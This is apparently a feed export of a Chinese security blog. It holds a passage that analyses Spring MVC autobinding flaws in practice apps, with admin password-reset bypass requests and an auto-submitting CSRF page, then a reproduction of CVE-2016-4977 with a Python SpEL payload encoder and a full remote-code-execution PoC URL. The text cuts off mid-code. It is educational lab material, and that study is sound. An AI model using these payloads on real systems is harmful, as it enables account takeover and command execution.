userService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome reset ! "</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetHandler</span><span class="params">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Checking username "</span> + username);</span><br><span class="line">User user = userService.findByName(username);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line">logger.info(<span class="string">"there is no user with name "</span> + username);</span><br><span class="line">model.addAttribute(<span class="string">"error"</span>, <span class="string">"Username is not found"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>, user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">"redirect:resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewQuestionHandler</span><span class="params">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome resetQuestion ! "</span> + user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetQuestionHandler</span><span class="params">(@RequestParam String answerReset, SessionStatus status,</span></span></span><br><span class="line"><span class="function"><span class="params">User user, Model model)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Checking resetQuestion ! "</span> + answerReset + <span class="string">" for "</span> + user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!user.getAnswer().equals(answerReset)) &#123;</span><br><span class="line">logger.info(<span class="string">"Answer in db "</span> + user.getAnswer() + <span class="string">" Answer "</span> + answerReset);</span><br><span class="line">model.addAttribute(<span class="string">"error"</span>, <span class="string">"Incorrect answer"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status.setComplete();</span><br><span class="line">String newPassword = GeneratePassword.generatePassowrd(<span class="number">10</span>);</span><br><span class="line">user.setPassword(newPassword);</span><br><span class="line">userService.updateUser(user);</span><br><span class="line"></span><br><span class="line">model.addAttribute(<span class="string">"message"</span>, <span class="string">"Your new password is "</span> + newPassword);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单理下：</p><ol><li>ResetPasswordController类是被<code>@SessionAttributes(&quot;user&quot;)</code>注解修饰的，即会自动把user对象放到session中。</li><li>这里/reset接口就是直接对应的resetHandler()函数。在POST方式的resetHandler()函数中，先判断当前用户名是否存在，若存在则将user添加到model中，再重定向到resetQuestion中作进一步处理；<strong>可以看到，两个resetHandler()函数都没有直接从参数或者从session中获取user对象，因此resetHandler()函数不存在自动绑定漏洞</strong>。</li><li>这里/resetQuestion接口就是直接对应的resetQuestionHandler()函数。在GET方式的resetQuestionHandler()函数中，其唯一的user参数使用了·@ModelAttribute·注解修饰，即会将传递过来的user参数按名称注入到指定对象中，而这里实际上是从session中获取user对象；在POST方式的函数中，并没有使用<code>@ModelAttribute</code>注解修饰参数，但是Spring MVC会自动从session中提取user，并且使用相同的逻辑，用http请求参数去自动绑定对应的用户参数，该函数的代码逻辑，先获取user对象的answer属性值来跟我们从外部表单输入的answerReset值进行比较，若相等则往下成功重置用户密码，否则报错；<strong>也就是说，这两个resetQuestionHandler()函数都用到了session中的user对象，都存在自动绑定漏洞</strong>。</li></ol><p>由前面分析可知，resetQuestionHandler()函数就是自动绑定漏洞的逻辑漏洞代码所在，我们只需要对这个接口的以GET或POST方式传递User类对象的参数即可修改自动绑定的user对象的属性值，实现自动绑定漏洞的利用。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>我们先点击忘记密码，在这里输入admin用户名检测是否存在该用户：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/9.png" alt=""></p><p>若存在则直接跳转到/resetQuestion界面，这里是个密保找回的表单：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/5.png" alt=""></p><p>现在已知是存在admin用户的，下面就对admin用户进行自动绑定漏洞的攻击利用。</p><h5 id="攻击GET方式的-resetQuestion接口"><a href="#攻击GET方式的-resetQuestion接口" class="headerlink" title="攻击GET方式的/resetQuestion接口"></a>攻击GET方式的/resetQuestion接口</h5><p>直接往/resetQuestion接口发送包含user对象属性的参数即可直接篡改user对象的属性值：</p><p><code>GET /justiceleague/resetQuestion?answer=mi1k7ea</code></p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/1.png" alt=""></p><p>在Tomcat后台是可以看到日志记录了将admin用户的answer属性篡改了：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/2.png" alt=""></p><p>当然，user对象的其他参数也是可以直接通过变量绑定漏洞直接修改的，比如直接修改admin用户的密码：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/3.png" alt=""></p><h5 id="攻击POST方式的-resetQuestion接口"><a href="#攻击POST方式的-resetQuestion接口" class="headerlink" title="攻击POST方式的/resetQuestion接口"></a>攻击POST方式的/resetQuestion接口</h5><p>提交POST表单的页面就是前面/resetQuestion的界面，我们知道该表单包含两个参数即question和answerReset。</p><p>我们这里在原报文的基础上，直接添加user对象的属性为参数来篡改user属性值：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/4.png" alt=""></p><p>可以看到，虽然我们不知道真正的密保答案即admin用户的answer属性值，因此输入错误的answerReset参数值后就会显示回答错误，但是我们却成功篡改了admin的password，其他属性也是一样的操作即可。</p><p>除了这种利用方式外，POST方式的resetQuestionHandler()函数中还存在逻辑漏洞，即找回密码过程中进行密保问题回答的处理过程存在自动绑定漏洞绕过的风险。现在，我们只需要在原本POST报文的基础上加上answer参数、使其值直接和answerReset参数的一致，由于自动绑定漏洞的存在，将导致后台程序在比较user对象的answer属性值和我们表单提交的answerReset参数值是否相等时直接绕过了，从而执行了后面的代码实现密码重置：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/6.png" alt=""></p><p>此时到Tomcat后台查看，admin用户的answer被篡改为test，password被成功重置了和页面返回的一样：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/7.png" alt=""></p><h3 id="Edik"><a href="#Edik" class="headerlink" title="Edik"></a>Edik</h3><p>将war包放置于Tomcat中跑起来后，看到Edik主要有主页、注册、登录等几个页面。</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>打开源码Controller部分，发现只有HomeController和RegistrationController这两个Controller文件。而其中使用<code>@ModelAttribute</code>或<code>@SessionAttributes</code>注解的只有HomeController这个文件，也就是说，有且仅有HomeController中会存在自动绑定漏洞。</p><p>我们看到HomeController的源码，这里只看有相关注解的部分即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@ModelAttribute</span>(<span class="string">"secondSecret"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getSecretCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.debug(secondSecret);</span><br><span class="line"><span class="keyword">return</span> secondSecret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ModelAttribute</span>(<span class="string">"showSecret"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Boolean <span class="title">getShowSectet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.debug(<span class="string">"flag: "</span> + showSecret);</span><br><span class="line"><span class="keyword">return</span> showSecret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/home"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">home</span><span class="params">(@ModelAttribute User user, Model model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (showSecret)&#123;</span><br><span class="line">model.addAttribute(<span class="string">"firstSecret"</span>, firstSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知：</p><ol><li>HomeController使用<code>@SessionAttributes</code>注解修饰user对象，说明user对象会保存到session中；</li><li>使用<code>@ModelAttribute</code>注解的地方总共有3处，前两处是修饰方法，使方法在每次调用该控制器类的请求处理方法前被调用，主要用于日志记录；第三处是修饰的/home接口对应的home()函数的user参数，该接口是GET方式访问的；</li></ol><p>由此可知，HomeController的home()函数处是存在自动绑定漏洞的，因为通过注解和自动绑定机制我们可以直接通过参数的形式给home()函数的user对象传递恶意的属性值，而最后返回”home”会跳转到home界面进行展示。</p><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>这个站点本身没有更多的业务功能能让我们进行更深的利用。</p><h5 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h5><p>先注册个用户，然后登录，看到是跳转到了/home路径，这里页面展示了当前用户名和体重信息：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/10.png" alt=""></p><p>这里直接对/home接口以GET方式传递user对象的属性值，比如直接篡改用户名：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/11.png" alt=""></p><p>User类对象的另外两个属性password和weight也是同样能被修改的。</p><h5 id="自动绑定漏洞-XSS组合拳"><a href="#自动绑定漏洞-XSS组合拳" class="headerlink" title="自动绑定漏洞+XSS组合拳"></a>自动绑定漏洞+XSS组合拳</h5><p>这里很鸡肋：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/12.png" alt=""></p><h5 id="自动绑定漏洞-CSRF组合拳"><a href="#自动绑定漏洞-CSRF组合拳" class="headerlink" title="自动绑定漏洞+CSRF组合拳"></a>自动绑定漏洞+CSRF组合拳</h5><p>此外，自动绑定漏洞能和CSRF组合利用。</p><p>比如将修改password的自动绑定漏洞的链接和CSRF组合，通过诱使受害者访问即可成功修改受害者的密码，恶意csrf.html如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.1:8080/edik/home?password=666'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">  m.click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/128" target="_blank" rel="noopener">浅析自动绑定漏洞</a></p><p><a href="https://xz.aliyun.com/t/1089" target="_blank" rel="noopener">Spring MVC Autobinding漏洞实例初窥</a></p><p><a href="https://www.anquanke.com/post/id/86278" target="_blank" rel="noopener">【技术分享】自动绑定漏洞和Spring MVC</a></p><p><a href="http://www.beesfun.com/2017/07/22/Spring-MVC-自动绑定漏洞/" target="_blank" rel="noopener">Spring MVC 自动绑定漏洞</a></p><p><a href="http://c.biancheng.net/view/4412.html" target="_blank" rel="noopener">Spring MVC中@ModelAttribute注解的使用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Security OAuth2之CVE-2016-4977</title>
    <link href="https://www.mi1k7ea.com/2020/02/09/%E6%B5%85%E6%9E%90Spring-Security-OAuth2%E4%B9%8BCVE-2016-4977/"/>
    <id>https://www.mi1k7ea.com/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/</id>
    <published>2020-02-09T14:22:22.000Z</published>
    <updated>2020-02-11T14:33:06.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Security-OAuth2"><a href="#0x01-Spring-Security-OAuth2" class="headerlink" title="0x01 Spring Security OAuth2"></a>0x01 Spring Security OAuth2</h2><h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p>OAuth 2.0是用于授权的行业标准协议，核心思路是通过各类认证手段（具体什么手段OAuth 2.0不关心）认证用户身份，并颁发token，使得第三方应用可以使用该token在限定时间、限定范围内访问指定资源。OAuth 2.0致力于简化客户端开发人员的工作，同时为Web应用程序、桌面应用程序、移动电话和客厅设备提供特定的授权流程。</p><p>OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</p><p>“客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。</p><p>校验流程如图：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/4.png" alt=""></p><p>具体的讲解可参考：<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">《理解OAuth 2.0》</a></p><h3 id="Spring-Security-OAuth2"><a href="#Spring-Security-OAuth2" class="headerlink" title="Spring Security OAuth2"></a>Spring Security OAuth2</h3><p>Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块，主要包含认证服务器和资源服务器这两大块的实现：</p><p>Spring Security OAuth2主要包含认证服务器和资源服务器这两大块的实现：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/5.png" alt=""></p><p>认证服务器主要包含了四种授权模式的实现和Token的生成与存储，我们也可以在认证服务器中自定义获取Token的方式；资源服务器主要是在Spring Security的过滤器链上加了OAuth2AuthenticationProcessingFilter过滤器，即使用OAuth2协议发放令牌认证的方式来保护我们的资源。</p><p>更多的参考官方文档即可。</p><h2 id="0x02-CVE-2016-4977"><a href="#0x02-CVE-2016-4977" class="headerlink" title="0x02 CVE-2016-4977"></a>0x02 CVE-2016-4977</h2><p>在Spring Security OAuth2的漏洞版本中，当用户使用<code>whitelabel views</code>来处理错误时，由于使用了SpEL表达式，攻击者在被授权的情况下可以通过构造恶意参数来RCE。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>2.0.0 to 2.0.9</li><li>1.0.0 to 1.0.5</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://vulhub.org/#/environments/spring/CVE-2016-4977/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2016-4977/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问如下链接，使用admin:admin登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;123*456&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br><span class="line">或</span><br><span class="line">http://your-ip:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;123*456&#125;</span><br></pre></td></tr></table></figure><p>在页面响应中会发现URL其中的参数的SpEL表达式会被解析，前面两个不同参数的注入在页面显示的报错信息也不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error=&quot;unsupported_response_type&quot;, error_description=&quot;Unsupported response types: [56088]&quot;</span><br><span class="line">或</span><br><span class="line">error=&quot;invalid_grant&quot;, error_description=&quot;Invalid redirect: 56088 does not match one of the registered values: [http://localhost]&quot;</span><br></pre></td></tr></table></figure><p>此时已证明是存在SpEL表达式注入漏洞了。下面就进行漏洞利用。</p><p>注意，如果直接将对应的参数改为恶意的SpEL表达式来尝试执行某些命令的话会发现大多数不能成功，原因可参考：<a href="https://x.hacking8.com/post-294.html" target="_blank" rel="noopener">Java Runtime.getRuntime().exec() 的那些payloads</a></p><p>这里直接用P神的脚本，原理是会用ord()函数将命令中的每个字符转换为ASCII码，再通过字符串拼接以及调用toString()函数来实现命令还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">'$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   poc += <span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += <span class="string">')&#125;'</span></span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p>这里输入<code>touch /tmp/mi1k7ea</code>，生成如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;</span><br></pre></td></tr></table></figure><p>最后将该内容替换到前面URL的会被SpEL解析的参数中构造出最终的PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p>访问后页面显示如下：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/1.png" alt=""></p><p>到后台发现命令成功执行：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/2.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，直接看到关键的几个函数。</p><p>这里我们选择2.0.9版本的Spring Security Oauth的代码来分析。</p><p>由前面页面的显示知道，在Spring Security Oauth2中是使用了<code>whitelabel views</code>来处理错误的，而漏洞点正是出在这个错误的处理过程中。</p><p>接着我们找到对应的错误处理的源码路径：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java</a></p><p>看到WhitelabelErrorEndpoint类中，其含有一个handlerError()函数用于处理错误，这里会获取请求中的error，将其转换为OAuth2Exception类型，然后调用getSummary()函数来获取错误信息并进行HTML编码后赋值给errorSummary变量，将该变量put进model中，最后用SpelView()来渲染：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Controller for displaying the error page for the authorization server.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Dave Syer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@FrameworkEndpoint</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelErrorEndpoint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR = <span class="string">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/oauth/error"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleError</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">Map&lt;String, Object&gt; model = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">Object error = request.getAttribute(<span class="string">"error"</span>);</span><br><span class="line"><span class="comment">// The error summary may contain malicious user input,</span></span><br><span class="line"><span class="comment">// it needs to be escaped to prevent XSS</span></span><br><span class="line">String errorSummary;</span><br><span class="line"><span class="keyword">if</span> (error <span class="keyword">instanceof</span> OAuth2Exception) &#123;</span><br><span class="line">OAuth2Exception oauthError = (OAuth2Exception) error;</span><br><span class="line">errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">errorSummary = <span class="string">"Unknown error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.put(<span class="string">"errorSummary"</span>, errorSummary);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(ERROR), model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里errorSummary变量的值就是获取的我们输入的恶意参数的值即恶意SpEL表达式，此时errorSummary变量值为前面生成的PoC的内容即<code>${T(java.lang.Runtime).getRuntime().exec(...)}</code>。</p><p>接着我们看下SpelView类的源码，路径为：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Simple String template renderer.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpelView</span> <span class="keyword">implements</span> <span class="title">View</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SpelView</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.template = template;</span><br><span class="line"><span class="keyword">this</span>.context.addPropertyAccessor(<span class="keyword">new</span> MapAccessor());</span><br><span class="line"><span class="keyword">this</span>.helper = <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="string">"$&#123;"</span>, <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">this</span>.resolver = <span class="keyword">new</span> PlaceholderResolver() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">Expression expression = parser.parseExpression(name);</span><br><span class="line">Object value = expression.getValue(context);</span><br><span class="line"><span class="keyword">return</span> value == <span class="keyword">null</span> ? <span class="keyword">null</span> : value.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line">String result = helper.replacePlaceholders(template, resolver);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 